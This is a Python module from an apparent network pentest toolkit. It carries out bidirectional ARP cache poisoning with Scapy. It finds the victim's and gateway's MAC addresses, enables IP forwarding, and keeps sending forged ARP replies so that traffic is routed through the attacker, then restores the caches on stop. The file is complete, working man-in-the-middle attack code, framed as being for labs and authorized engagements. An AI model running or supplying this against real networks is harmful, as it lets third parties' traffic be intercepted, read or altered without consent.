"""ARP poisoning kit with disciplined automatic restore.

The promise that separates this from the typical 20-line GitHub script: on
``stop()`` the real IP→MAC bindings are pushed back to both victims three
times, and ``ip_forward`` is returned to its original value if we changed it.
Run only inside a lab or an engagement you are authorized to perform.
"""

from __future__ import annotations

import logging
import threading
from datetime import datetime, timezone

from scapy.all import ARP, Ether, conf, get_if_hwaddr
from scapy.packet import Packet
from typing_extensions import Self

from vtknet.core.engine import Engine

log = logging.getLogger("vtknet.mitm")

BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"
PROC_FORWARD = "/proc/sys/net/ipv4/ip_forward"


def arp_reply(dst_mac: str, sender_ip: str, sender_mac: str, target_ip: str) -> Packet:
    """Craft one ARP reply: 'sender_ip is at sender_mac' delivered to dst_mac."""
    return Ether(dst=dst_mac) / ARP(op=2, psrc=sender_ip, hwsrc=sender_mac, pdst=target_ip)


def poison_packets(
    victim_ip: str, victim_mac: str, gateway_ip: str, gateway_mac: str, my_mac: str
) -> list[Packet]:
    """Bidirectional poison: victim thinks gateway=us, gateway thinks victim=us."""
    return [
        arp_reply(victim_mac, gateway_ip, my_mac, victim_ip),
        arp_reply(gateway_mac, victim_ip, my_mac, gateway_ip),
    ]


def restore_packets(
    victim_ip: str, victim_mac: str, gateway_ip: str, gateway_mac: str
) -> list[Packet]:
    """Correct bindings pushed to both sides (the cleanup the toolkit promises)."""
    return [
        arp_reply(victim_mac, gateway_ip, gateway_mac, victim_ip),
        arp_reply(gateway_mac, victim_ip, victim_mac, gateway_ip),
    ]


def _read_forward(path: str) -> int | None:
    try:
        with open(path) as fh:
            return int(fh.read().strip())
    except (OSError, ValueError):
        return None


def _write_forward(path: str, value: int) -> bool:
    try:
        with open(path, "w") as fh:
            fh.write(str(value))
        return True
    except OSError:
        return False


class ArpSpoofer:
    """Poison loop + guaranteed restore. Use as a context manager.

    ``start()`` resolves both MACs over ARP, snapshots ``ip_forward`` (and
    enables it if allowed), then refreshes poison packets in a background
    thread. ``stop()`` halts the loop, restores correct ARP caches (3x) and
    reverts ``ip_forward``.
    """

    def __init__(
        self,
        engine: Engine,
        victim_ip: str,
        gateway_ip: str,
        *,
        interval: float = 2.0,
        manage_forward: bool = True,
        forward_path: str = PROC_FORWARD,
    ) -> None:
        self.engine = engine
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.interval = interval
        self.manage_forward = manage_forward
        self._forward_path = forward_path
        self._stop_event = threading.Event()
        self._thread: threading.Thread | None = None
        self.victim_mac: str | None = None
        self.gateway_mac: str | None = None
        self.my_mac: str | None = None
        self.poisons_sent = 0
        self.restores_sent = 0
        self._forward_snapshot: int | None = None
        self._forward_changed = False
        self.started_at: str | None = None

    # -- lifecycle ---------------------------------------------------------

    def _resolve_mac(self, ip: str) -> str | None:
        rep = self.engine.send1(Ether(dst=BROADCAST_MAC) / ARP(op=1, pdst=ip), l2=True)
        if rep is not None and rep.haslayer(ARP):
            mac = rep[ARP].hwsrc
            if mac and mac != "00:00:00:00:00:00":
                return mac
        return None

    def start(self) -> None:
        if self.engine.cfg.dry_run:
            log.info(
                "dry-run: would poison %s <-> %s every %.1fs (manage_forward=%s), "
                "then restore both ARP caches on stop",
                self.victim_ip,
                self.gateway_ip,
                self.interval,
                self.manage_forward,
            )
            return
        self.victim_mac = self._resolve_mac(self.victim_ip)
        self.gateway_mac = self._resolve_mac(self.gateway_ip)
        if not self.victim_mac or not self.gateway_mac:
            raise RuntimeError(
                f"cannot resolve MACs (victim={self.victim_mac}, gateway={self.gateway_mac}) "
                "— both hosts must be on the same L2 segment"
            )
        iface = self.engine.cfg.iface or conf.iface
        self.my_mac = get_if_hwaddr(iface)
        if self.manage_forward:
            self._forward_snapshot = _read_forward(self._forward_path)
            if self._forward_snapshot == 0:
                self._forward_changed = _write_forward(self._forward_path, 1)
                if not self._forward_changed:
                    log.warning(
                        "could not enable ip_forward — traffic will not be relayed (partial MITM)"
                    )
        self.started_at = datetime.now(timezone.utc).isoformat(timespec="milliseconds")
        self._thread = threading.Thread(target=self._poison_loop, daemon=True)
        self._thread.start()
        log.info(
            "ARP poisoning %s (%s) <-> %s (%s) via %s on %s",
            self.victim_ip,
            self.victim_mac,
            self.gateway_ip,
            self.gateway_mac,
            self.my_mac,
            iface,
        )

    def _poison_loop(self) -> None:
        pkts = poison_packets(
            self.victim_ip, self.victim_mac, self.gateway_ip, self.gateway_mac, self.my_mac
        )
        while not self._stop_event.is_set():
            self.engine.send(pkts, l2=True)
            self.poisons_sent += len(pkts)
            self._stop_event.wait(self.interval)

    def stop(self) -> dict:
        """Halt poisoning and restore the network. Always call exactly once."""
        self._stop_event.set()
        if self._thread is not None:
            self._thread.join(timeout=self.interval + 2.0)
            self._thread = None
        if not self.engine.cfg.dry_run and self.victim_mac and self.gateway_mac:
            restores = restore_packets(
                self.victim_ip, self.victim_mac, self.gateway_ip, self.gateway_mac
            )
            for _ in range(3):
                self.engine.send(restores, l2=True)
                self.restores_sent += len(restores)
            log.info("ARP caches restored (%d restore packets)", self.restores_sent)
        if self._forward_changed:
            if _write_forward(self._forward_path, self._forward_snapshot or 0):
                self._forward_changed = False
                log.info("ip_forward restored to %s", self._forward_snapshot)
            else:
                log.warning(
                    "FAILED to restore ip_forward — fix manually: "
                    f"sysctl -w net.ipv4.ip_forward={self._forward_snapshot}"
                )
        return self.stats()

    def stats(self) -> dict:
        return {
            "victim_mac": self.victim_mac,
            "gateway_mac": self.gateway_mac,
            "poisons_sent": self.poisons_sent,
            "restores_sent": self.restores_sent,
            "forward_restored": not self._forward_changed,
        }

    def __enter__(self) -> Self:
        self.start()
        return self

    def __exit__(self, *exc: object) -> None:
        self.stop()
